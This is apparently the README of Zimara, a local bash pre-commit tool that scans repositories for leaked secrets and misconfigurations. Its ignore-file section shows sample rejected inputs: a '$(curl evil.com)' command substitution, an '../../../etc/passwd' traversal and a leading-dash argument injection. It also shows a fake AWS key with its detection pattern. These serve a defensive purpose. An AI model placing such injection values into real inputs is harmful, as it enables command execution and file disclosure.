# Zimara

**Version:** 0.49.5  
**Status:** Production-ready  
**Published by:** Oob Skulden™

Zimara is a comprehensive pre-commit security audit tool for modern development workflows.

It catches the stuff that always bites later — before your code leaves your laptop:

- Secrets and credentials hardcoded in source
- Infrastructure-as-Code misconfigurations
- CI/CD pipeline vulnerabilities
- Container and Docker security issues
- Static site output exposure
- Git history leaks

It runs fast, stays local, and doesn't try to be cleverer than it needs to be.

-----

## What's New in 0.49.5

**Evolution: From Static Site Scanner to DevSecOps Validator**

Zimara v0.49.5 expands from 45 to **53 security checks**, covering the full development lifecycle — not just static sites.

**New security domains:**

- **Infrastructure-as-Code** — Terraform and CloudFormation hardcoded secrets, overly permissive configurations, drift detection
- **Container Security** — Insecure Docker base images, unsigned container pushes, build artifact tampering
- **CI/CD Pipeline Security** — GitHub Actions risks, pipeline secret injection, third-party action vulnerabilities

**Enterprise features:**

- **Structured outputs** — JSON and SARIF formats for security dashboards (GitHub Code Scanning, GitLab Security, Azure DevOps)
- **Baseline diffing** — Incremental adoption in legacy codebases without overwhelming teams
- **Complete scan coverage** — All 53 checks execute using `set -u` and `set -o pipefail` without `set -e`

**Snippet-Enhanced Findings**

Zimara shows you exactly where problems are with file:line references and code context:

```
  Possible Secret
  File: src/config.js:42
  ----------------------------------------
      40 | const config = {
      41 |   apiUrl: process.env.API_URL,
  >>  42 |   apiKey: "AKIA00000000EXAMPLE1234",
      43 |   timeout: 5000
      44 | };
  ----------------------------------------
  Pattern: (AKIA[0-9A-Z]{16}|...)
  Action: Remove secret, rotate credentials, use env vars
```

No more hunting through files to find what Zimara flagged.

**.zimaraignore Support (Hardened)**

Sometimes you need to exclude files from scanning — test fixtures with intentional "secrets", third-party code, generated files. Zimara supports `.zimaraignore` with security-first design:

```
# .zimaraignore - patterns to exclude from scanning

# Test fixtures (ok to have fake secrets)
tests/fixtures/*

# Third-party code
vendor/*
node_modules/*

# Generated files
dist/*
*.min.js
```

**Security hardening includes:**

- Character whitelist enforcement (no shell metacharacters)
- Pattern length limits (200 chars max)
- Injection prevention (no leading dashes, no `..` traversal)
- Maximum pattern count (100 patterns)
- Warnings on overly broad patterns

See the [.zimaraignore section](#zimaraignore-file) below for details.

-----

## Why This Exists

Most security problems don't start in CI. They start locally, right before a commit or push, in that moment where everything looks fine but absolutely isn't.

Zimara sits in that gap.

It's the friend who asks "hey, are you sure you want to commit that?" before GitHub Actions has a chance to judge you.

-----

## What Zimara Scans

Zimara works with any Git repository and automatically detects your stack.

### Infrastructure & Deployment

- **IaC files** — Terraform (.tf), CloudFormation (.yaml/.json), Pulumi
- **Containers** — Dockerfiles, docker-compose.yml, base image security
- **CI/CD pipelines** — GitHub Actions (.github/workflows/), GitLab CI, CircleCI
- **Kubernetes** — Manifests, Helm charts, secrets management

### Web Applications & Sites

- **Static sites** — Hugo, Jekyll, Astro, Eleventy, Next.js (static export)
- **Single-page applications** — React, Vue, Angular builds
- **Serverless** — Netlify/Vercel functions, AWS Lambda
- **Build output** — dist/, public/, build/, _site/ directories

### General Development

- **Source code** — Any language, any framework
- **Configuration** — .env files, config/*.yml, settings
- **Git security** — History scanning, hook permissions, remote URLs
- **Dependencies** — npm audit results, lockfile integrity

No configuration required. Zimara detects your project type and runs the relevant checks automatically.

-----

## What Zimara Does

Zimara performs a read-only security sweep of your repository and flags the common, real-world mistakes that routinely turn into incidents nobody wants to explain.

It does **not** modify files, install tools, or make network calls.

### 53 security checks across 6 domains:

#### 1. Secrets & Credentials (Checks 1-20)
- API keys, tokens, passwords in source code
- AWS/GCP/Azure credentials (AKIA*, AIza*, etc.)
- Private keys and certificates (.pem, .key, .p12, .pfx)
- SSH keys and authorized_keys exposure
- Environment variable misuse patterns
- Database connection strings
- OAuth tokens and refresh tokens

#### 2. Repository Hygiene (Checks 21-30)
- .env files committed to Git
- Backup and temp artifacts (.bak, .old, .swp)
- Debug logs and database dumps
- Git history containing sensitive extensions
- .git/ directory in build output
- Worktree cleanliness

#### 3. Static Site Security (Checks 31-35)
- Mixed content (HTTP in HTTPS pages)
- Internal IPs and localhost in output
- Development URLs in production builds
- Security headers (CSP, X-Frame-Options, HSTS)
- robots.txt and sitemap exposure

#### 4. Infrastructure-as-Code (Checks 46-49)
- Hardcoded secrets in Terraform/CloudFormation
- Overly permissive IAM policies
- Insecure security group rules
- Infrastructure drift indicators

#### 5. Container & Pipeline Security (Checks 47, 50-53)
- Insecure Docker base images
- Unsigned container pushes
- Pipeline secret injection risks
- Build artifact tampering
- Third-party GitHub Action risks

#### 6. CI/CD Configuration (Checks 36-45)
- GitHub Actions security misconfigurations
- Unpinned action versions
- World-writable Git hooks
- Missing security.txt
- Dependabot configuration issues

**Want details on every check?** See [CHECKS.md](CHECKS.md) for complete documentation with remediation steps.

**Need setup help?** See [INTEGRATION.md](INTEGRATION.md) for Git hooks and CI/CD configuration.

-----

## What Zimara Does Not Do

Zimara is intentionally scoped. It will not:

- Scan for CVEs
- Manage your dependencies
- Generate compliance reports
- Replace your CI security tooling
- Analyze your cloud infrastructure
- Become sentient and judge your life choices (though it might feel that way sometimes)

If you need those things, fantastic — run them too. Zimara just runs **earlier**, when it matters most.

-----

## What Zimara Catches That CI Doesn't

**Scenario:** You're testing a Terraform deployment locally. You hardcode an AWS access key "just for five minutes" to debug something.

Then you fix the bug, feel good about yourself, and commit.

**What happens next:**

- **CI:** Passes (you haven't configured a secrets scanner yet because "we'll do that next sprint")
- **GitHub:** Indexes it
- **AWS:** Detects exposed key within hours
- **Attacker:** Uses it to spin up EC2 instances for cryptomining
- **Your weekend:** Explaining to leadership why the AWS bill is $12,000

**Zimara in a pre-commit hook:** Blocks the commit. Key never leaves your laptop. You get coffee instead of a postmortem.

That's the whole point.

-----

## Requirements

- Bash 3.2+ (macOS and legacy system compatible)
- Standard Unix tools (grep, awk, sed, find)
- Git (for history and hook usage)

**Typical runtime:** Under 5 seconds for repos under 10,000 files

**Supported environments:**

- Linux (all major distributions)
- macOS (native bash 3.2+ support)
- Windows WSL 2 (confirmed working - not native Windows)
- Docker containers (see [INTEGRATION.md](INTEGRATION.md#docker-containers) for usage)

No internet access required. No installs beyond the script itself. No sudo. No telemetry. No "please create an account to continue."

-----

## Installation

Clone or copy the script somewhere sane.

Make it executable:

```bash
chmod +x zimara.sh
```

Optional but recommended: put it in your PATH.

```bash
mv zimara.sh /usr/local/bin/zimara
```

Done.

**Windows users:** Zimara requires bash and Unix tools. Use WSL 2 (recommended) or Docker Desktop. See [INTEGRATION.md - Docker Containers](INTEGRATION.md#docker-containers) for setup instructions.

**Docker users:** No installation needed. See [INTEGRATION.md - Docker Containers](INTEGRATION.md#docker-containers) for container-based usage.

-----

## Usage

### Scan the current directory

```bash
zimara
```

or

```bash
./zimara.sh
```

### Scan a specific path

```bash
zimara /path/to/repo
```

That's it. No config files, no setup wizard, no "getting started" documentation that's somehow 47 pages long.

-----

## Options

```bash
zimara [path] [options]
```

|Option                 |Description                                             |
|-----------------------|--------------------------------------------------------|
|`[path]`               |Directory to scan (default: current directory)          |
|`-n, --non-interactive`|No prompts; strict exit codes (CI-safe)                 |
|`-o, --only-output`    |Scan build output only, skip source files               |
|`-v, --verbose`        |More detailed output (useful for debugging)             |
|`--trace-checks`       |Print ENTER/EXIT markers for each check (deep debugging)|
|`--snippet-context N`  |Lines of context around findings (default: 3)           |
|`--no-snippet-pattern` |Don't show regex patterns in snippet output             |
|`--format FORMAT`      |Output format: text, json, sarif (default: text)        |
|`--baseline FILE`      |Compare against baseline file for incremental adoption  |
|`--save-baseline FILE` |Save current findings as baseline for future comparisons|
|`--version`            |Print version and exit                                  |
|`-h, --help`           |Show help and exit                                      |

### Examples

```bash
# Basic scan
zimara

# Scan specific directory with verbose output
zimara /path/to/repo --verbose

# CI mode (no prompts, strict exit codes)
zimara --non-interactive

# Only check what gets deployed
zimara --only-output

# Debug a specific check failure
zimara --trace-checks --verbose

# More context around findings (5 lines instead of 3)
zimara --snippet-context 5

# Hide regex patterns in output (cleaner for reports)
zimara --no-snippet-pattern

# Generate JSON output for CI/CD integration
zimara --format json --non-interactive

# Generate SARIF output for security dashboards
zimara --format sarif > results.sarif

# Incremental adoption: save baseline from current state
zimara --save-baseline .zimara-baseline.json

# Only report new findings since baseline
zimara --baseline .zimara-baseline.json --non-interactive
```

-----

## Structured Outputs and Baselines

### Output Formats

Zimara supports three output formats for different use cases:

**Text (default)** — Human-readable terminal output with syntax highlighting
```bash
zimara
```

**JSON** — Machine-parseable output for CI/CD integration
```bash
zimara --format json > results.json
```

**SARIF** — Static Analysis Results Interchange Format for security dashboards
```bash
zimara --format sarif > results.sarif
```

SARIF output integrates with:
- GitHub Code Scanning
- GitLab Security Dashboard  
- Azure DevOps Security
- Most SAST/DAST platforms

### Baseline Diffing for Incremental Adoption

Large codebases often have existing security debt. Zimara's baseline feature lets you:

1. Accept current findings as "known issues"
2. Only fail on *new* security problems
3. Gradually reduce technical debt over time

**Create a baseline from current state:**
```bash
zimara --save-baseline .zimara-baseline.json
```

**Only report new findings:**
```bash
zimara --baseline .zimara-baseline.json --non-interactive
```

This exits 0 if no new issues are found, even if baseline issues remain.

**Workflow for existing projects:**
```bash
# 1. Initial baseline
zimara --save-baseline .zimara-baseline.json
git add .zimara-baseline.json
git commit -m "Add Zimara security baseline"

# 2. Add to CI to block new issues
# .github/workflows/security.yml
zimara --baseline .zimara-baseline.json --format sarif --non-interactive

# 3. Gradually fix baseline issues
# Each fix reduces the baseline, improving security over time
```

**Security note:** Baseline files use content-aware fingerprinting. You can't bypass findings by editing the baseline — Zimara validates fingerprints against actual file content.

-----

## .zimaraignore File

Create a `.zimaraignore` file in your repository root to exclude files from scanning.

### Basic Usage

```
# .zimaraignore - patterns to exclude from Zimara scans

# Test fixtures with intentional fake secrets
tests/fixtures/*
test/mock-data/*

# Third-party code
vendor/*
node_modules/*

# Generated files
dist/*
build/*
*.min.js
*.bundle.js

# Hugo theme example content
themes/*/exampleSite/*
```

### Pattern Syntax

- Filename patterns: `*.min.js`
- Directory patterns: `node_modules/*`
- Nested paths: `vendor/oauth-lib/tests/*`
- Specific files: `test-data.json`

**Character restrictions (security):**

Allowed: `a-z A-Z 0-9 . / - _ *`

**Limits:**

- Maximum 100 patterns
- Maximum 200 characters per pattern
- Patterns validated on load

**Rejected patterns (security):**

- Leading dashes: `--exclude` (argument injection)
- Path traversal: `../secrets` (directory escape)
- Absolute paths: `/etc/passwd` (filesystem access)

### Security Features

Zimara's `.zimaraignore` implementation is hardened against injection attacks:

1. **Character whitelisting** — Only safe characters allowed
1. **Pattern validation** — Malformed patterns rejected with warnings
1. **Length limits** — Prevents resource exhaustion
1. **Injection prevention** — No command execution possible through patterns

**Example security rejection:**

```bash
# .zimaraignore
--exclude=secrets.txt    # REJECTED: leading dash (injection)
../../../etc/passwd      # REJECTED: path traversal
/var/log/*               # REJECTED: absolute path
$(curl evil.com)         # REJECTED: invalid characters
```

Each rejected pattern logs a warning but doesn't break the scan.

### When to Use .zimaraignore

**Good reasons:**

- Test fixtures with intentional "secrets" (fake keys for testing)
- Third-party code you don't control (vendor/, node_modules/)
- Generated files that trigger false positives
- Documentation with example credentials

**Bad reasons:**

- Hiding real secrets (fix the root cause instead)
- Excluding production code (you're just hiding problems)
- Working around "annoying" findings (those are the important ones)

### .zimaraignore in CI

The `.zimaraignore` file is committed to your repository, so patterns apply everywhere:

- ? Local pre-commit hooks
- ? CI/CD pipelines
- ? Team member machines
- ? Code review automation

This ensures consistent scanning behavior across environments.

**Team adoption tip:** Document why patterns are excluded in comments:

```
# Third-party OAuth library with test keys (not ours to fix)
vendor/oauth-sdk/*

# Hugo theme with example API keys in demo content
themes/example-theme/exampleSite/*
```

-----

## Interactive vs Non-Interactive

### Interactive (default)

- You'll be prompted on Medium and Low findings
- High and Critical findings stop execution immediately
- Best for local development when you want a conversation, not a verdict

### Non-Interactive

```bash
zimara --non-interactive
```

- No prompts
- Deterministic exit codes
- Designed for Git hooks and CI environments where humans aren't around to answer questions

-----

## Output-Only Mode

```bash
zimara --only-output
```

Skips source scanning and focuses exclusively on generated output directories.

Useful when you want to sanity-check what you're about to deploy without re-scanning the entire repo for the third time today.

-----

## Exit Codes

|Code|Meaning                         |
|----|--------------------------------|
|0   |No findings, you're clean       |
|1   |Low/Medium findings acknowledged|
|2   |High findings (blocked)         |
|3   |Critical findings (blocked hard)|
|99  |Usage/input error               |

Non-interactive mode uses these strictly. Interactive mode will ask nicely before returning 1.

-----

## Git Hooks and CI/CD Integration

This is where Zimara really shines. See [INTEGRATION.md](INTEGRATION.md) for detailed setup guides covering:

- Pre-commit and pre-push hooks
- GitHub Actions, GitLab CI, CircleCI
- Docker container usage
- Team adoption strategies
- When to use additional tooling

**Quick start for Git hooks:**

```bash
# Create pre-commit hook
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
./zimara.sh --non-interactive
exit $?
EOF

chmod +x .git/hooks/pre-commit
```

Now every commit gets checked before it's created. Critical or High issues block immediately. No surprises after you push.

-----

## Safety Guarantees

Zimara is designed to be boring in the best possible way.

It:

- Does not modify files
- Does not write to the repo (except temp files in /tmp, which are cleaned on exit)
- Does not install anything
- Does not phone home
- Does not execute project code
- Does not require root
- Does not trust user input without validation

If it breaks, it fails closed and tells you why. If you find a way to make it do something dangerous, that's a bug — please report it.

-----

## When You Should Not Use Zimara

- You want vulnerability scores and CVE feeds - use a SAST tool
- You need compliance paperwork - hire an auditor
- You expect it to fix problems for you - it won't, by design
- You want cloud or runtime analysis - wrong layer entirely
- You think bash scripts are "unprofessional" - we can't be friends

Zimara is a flashlight, not an autopilot.

-----

## Philosophy

Most security tools assume you already messed up.

Zimara assumes you're trying not to.

It's not here to shame you. It's here to save you from yourself before the internet does.

Run it early. Run it often. Let it be annoying **now** instead of explaining it to your CISO **later**.

Or worse: explaining it to Reddit.

-----

## What's Not Planned

Zimara will not:

- Become a SaaS
- Add ML/AI "smart" detection (it's grep, not GPT)
- Require account creation or telemetry
- Grow beyond what fits in one bash script
- Pivot to blockchain
- Get acquired and then ruined

If you need enterprise features, fork it. If you want to contribute, keep it simple. If you want to sell it, you can't — it's not for sale.

-----

## Documentation

- [**CHECKS.md**][checks] – Complete reference for all 53 security checks  
- [**INTEGRATION.md**][integration] – Git hooks, CI/CD setup, and team adoption
- [**SECURITY.md**][security] – Security considerations, trust boundaries, and safe-usage guidance  
- [**CHANGELOG.md**](CHANGELOG.md) – Release history and notable changes
- [**LICENSE**][license] – AGPL-3.0  

[checks]: CHECKS.md
[integration]: INTEGRATION.md
[security]: SECURITY.md
[change log]: CHANGELOG.md
[license]: LICENSE


-----

## Contributing

PRs welcome for:

- New checks that catch real issues
- Bug fixes
- Performance improvements
- Better documentation

Not welcome:

- Scope creep
- Dependencies on tools most people don't have
- "Wouldn't it be cool if…" features that triple the runtime
- Anything that requires `npm install`

Keep it fast. Keep it local. Keep it honest.

-----

## License

[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
[![GitHub stars](https://img.shields.io/github/stars/oob-skulden/zimara)](https://github.com/oob-skulden/zimara/stargazers)

AGPL-3.0 License — see LICENSE file.


-----

## Credits

Written by a security engineer who started with a static site problem and realized the attack surface goes much deeper.

Built while working on overlooked cloud security surfaces, completed over multiple nights of questionable sleep hygiene, evolved from "static site scanner" to "DevSecOps validator" because security debt compounds everywhere.

Published by Oob Skulden™.

If this saved you from a bad day, you can say thanks by:

- Not committing secrets
- Actually running it before you push
- Telling other developers it exists

That's it. No donations (unless you want to cover a coffee or a five-dollar afternoon tea), no GitHub stars required (nice, but not mandatory), and no newsletter signups.

Maybe a YouTube video about it one day. Still not starting a newsletter.

Just… be careful out there. Things get spicy fast.

-----

**Questions?**  
Read the script. It's extensively commented.  
Still confused? Open an issue.  
Need consulting? You're on your own — this is a free tool, not a business.

**Published by Oob Skulden™**  
The threats you don't see coming.